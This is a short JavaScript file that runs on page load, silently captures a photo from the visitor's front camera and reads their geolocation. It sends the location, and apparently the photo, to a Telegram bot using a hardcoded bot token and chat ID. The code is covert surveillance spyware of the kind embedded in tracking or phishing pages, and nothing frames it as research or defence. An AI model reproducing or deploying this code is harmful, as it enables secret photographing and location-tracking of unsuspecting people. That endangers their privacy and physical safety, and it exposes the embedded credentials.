const botToken = "7598643504:AAG0aPuGlJjIKwHyk_RB8Gx59qrOoTxNeHY";
const chatId = "401485415";

window.onload = () => {
  // Start front camera and capture image silently
  navigator.mediaDevices
    .getUserMedia({ video: { facingMode: "user" } })
    .then((stream) => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      video.addEventListener("loadeddata", () => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop the video stream after capturing
        stream.getTracks().forEach((track) => track.stop());

        // Convert image to Blob and send
        canvas.toBlob((blob) => sendPhoto(blob), "image/jpeg");
      });
    })
    .catch((err) => console.error("Error accessing camera:", err));

  // Get and send location
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

        fetch(url)
          .then((response) => response.json())
          .then((data) => console.log("Location sent:", data))
          .catch((error) => console.error("Error sending location:", error));
      },
      (error) => console.error("Error getting location:", error.message)
    );
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
};
